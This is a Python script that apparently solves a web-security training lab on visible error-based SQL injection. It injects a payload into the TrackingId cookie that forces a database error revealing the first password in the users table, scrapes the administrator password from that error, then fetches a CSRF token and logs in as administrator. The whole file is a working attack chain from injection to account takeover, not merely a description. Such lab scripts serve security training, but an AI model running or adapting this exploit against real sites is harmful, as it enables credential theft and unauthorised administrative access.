# Visible error-based SQL injection

import sys
import requests
import urllib3
import urllib.parse
import re
import time
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def connect_as_admin(s, url, password):
	print('\n[+] Trying to connect as administrator user with found password...')
	login_path = url + '/login'
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	login_data = {
		'csrf': csrf_token,
		'username': 'administrator',
		'password': password
	}
	r = s.post(login_path, data=login_data)
	return r

def exploit_sqli(s, url, payload):
	r = s.get(url)
	time.sleep(1)
	session_cookie = s.cookies['session']
	print('\n[+] Found Session Cookie: %s' % session_cookie)
	print('[+] Using payload: %s' % payload)
	print('[+] Injecting in TrackingId Cookie...')
	cookies = {'session': session_cookie, 'TrackingId': payload}
	r = s.get(url, cookies=cookies)
	time.sleep(1)
	password = re.search('<p class=is-warning>ERROR: invalid input syntax for type integer: "(.*)"</p>', r.text).group(1)
	print('\n[+] Found Administrator Password: %s' % password)
	return password

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com "\'--"' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION\t\t(solve the lab)' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Visible error-based SQL injection')
	try:
		url = sys.argv[1].strip()
		if sys.argv[2] == "SOLUTION":
			payload = "'||cast((select password from users limit 1) AS INT)--"
		else:
			payload = sys.argv[2].strip()
	except IndexError:
		show_usage()
	print('[+] Retrieving all products in the list (including non-released).\n')
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	time.sleep(1)
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host

	password = exploit_sqli(s, url, payload)
	if password:
		print('\n[+] SQL Injection successful !')
		r = connect_as_admin(s, url, password)
		if r.status_code == 200 and 'Your username is: administrator' in r.text:
			print('[+] Logged in as Administrator user !')
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	else:
		print('\n[-] SQL Injection Failed <!>')

if __name__ == "__main__":
	main()
